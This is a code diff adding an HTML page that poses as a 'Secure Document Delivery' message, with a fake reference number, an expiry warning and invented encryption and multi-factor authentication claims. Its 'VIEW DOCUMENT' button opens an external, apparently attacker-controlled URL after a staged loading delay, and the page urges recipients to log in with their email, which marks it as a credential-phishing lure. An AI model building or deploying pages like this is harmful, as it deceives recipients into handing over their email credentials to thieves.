@@ -1,0 +1,94 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Document Delivery</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <script>
+    function viewDocument() {
+      const button = document.getElementById('viewButton');
+      const loader = document.getElementById('loader');
+      button.disabled = true;
+      loader.classList.remove('hidden');
+      setTimeout(() => {
+        window.open("https://coderocket.za.com/UPmmvCcT/", "_blank", "noopener,noreferrer");
+        button.disabled = false;
+        loader.classList.add('hidden');
+      }, 2000);
+    }
+  </script>
+</head>
+<body class="bg-gray-50 text-gray-800 font-sans">
+  <div class="max-w-xl mx-auto mt-10 shadow-lg rounded-lg overflow-hidden border border-gray-200">
+    <div class="bg-blue-600 text-white px-6 py-4">
+      <div class="flex items-center space-x-2">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M12 11c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2z"/>
+          <path d="M12 3C7.03 3 3 7.03 3 12c0 2.21.9 4.21 2.35 5.65L12 21l6.65-3.35C20.1 16.21 21 14.21 21 12c0-4.97-4.03-9-9-9z"/>
+        </svg>
+        <h1 class="text-lg font-semibold">Secure Message</h1>
+      </div>
+      <p class="text-sm opacity-90">07/21/2025 9:12 AM</p>
+    </div>
+    <div class="bg-white px-6 py-6 space-y-6">
+      <div>
+        <h2 class="text-lg font-medium">You have received a new document</h2>
+        <p class="text-sm text-gray-600">The message was sent securely to protect sensitive information included in the correspondence.</p>
+      </div>
+      <div class="border-t border-b py-4 space-y-2 text-sm">
+        <div class="flex justify-between"><span class="font-medium">Date Received</span><span>07/21/2025</span></div>
+        <div class="flex justify-between"><span class="font-medium">Reference Number</span><span>SP005581456</span></div>
+        <div class="flex justify-between"><span class="font-medium">Number of Pages</span><span>3</span></div>
+        <div class="flex justify-between"><span class="font-medium">Status Code</span><span class="text-green-600 font-medium">Successful</span></div>
+      </div>
+      <div class="space-y-4">
+        <button id="viewButton" onclick="viewDocument()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded flex items-center justify-center space-x-2">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path d="M4 4h16v16H4z" stroke="none"/>
+            <path d="M4 4h16v16H4z"/>
+            <path d="M8 4v16M16 4v16M4 8h16M4 16h16"/>
+          </svg>
+          <span>VIEW DOCUMENT (130kb)</span>
+        </button>
+        <div id="loader" class="hidden text-center text-sm text-blue-600">Loading secure document...</div>
+        <p class="text-xs text-center text-gray-500"><strong>Important Note:</strong> Login with your receiving email for a secured authentication to view document</p>
+      </div>
+      <div class="bg-yellow-100 border border-yellow-300 text-yellow-800 text-sm rounded-md p-3 flex items-center space-x-2">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M12 8v4l3 3"/>
+          <path d="M12 2a10 10 0 100 20 10 10 0 000-20z"/>
+        </svg>
+        <p>This secure message will expire in <strong>30 days</strong></p>
+      </div>
+      <div class="pt-4 border-t text-sm space-y-2">
+        <div class="flex items-center space-x-2">
+          <svg class="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path d="M12 12v.01"/>
+            <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+          </svg>
+          <span>End-to-End Encryption: All documents are encrypted during transmission and storage</span>
+        </div>
+        <div class="flex items-center space-x-2">
+          <svg class="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path d="M12 11c0-1.1.9-2 2-2s2 .9 2 2-.9 2-2 2-2-.9-2-2z"/>
+            <path d="M12 3C7.03 3 3 7.03 3 12c0 2.21.9 4.21 2.35 5.65L12 21l6.65-3.35C20.1 16.21 21 14.21 21 12c0-4.97-4.03-9-9-9z"/>
+          </svg>
+          <span>Secure Authentication: Multi-factor authentication ensures only authorized access</span>
+        </div>
+        <div class="flex items-center space-x-2">
+          <svg class="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path d="M3 3h18v18H3z"/>
+            <path d="M3 9h18M9 21V9"/>
+          </svg>
+          <span>Audit Trail: Complete tracking of document access and delivery status</span>
+        </div>
+      </div>
+    </div>
+    <div class="bg-gray-100 text-center text-xs text-gray-500 py-3">
+      © 2025 SecureDocuments. All rights reserved. | Secure • Reliable • Compliant
+    </div>
+  </div>
+</body>
+</html>
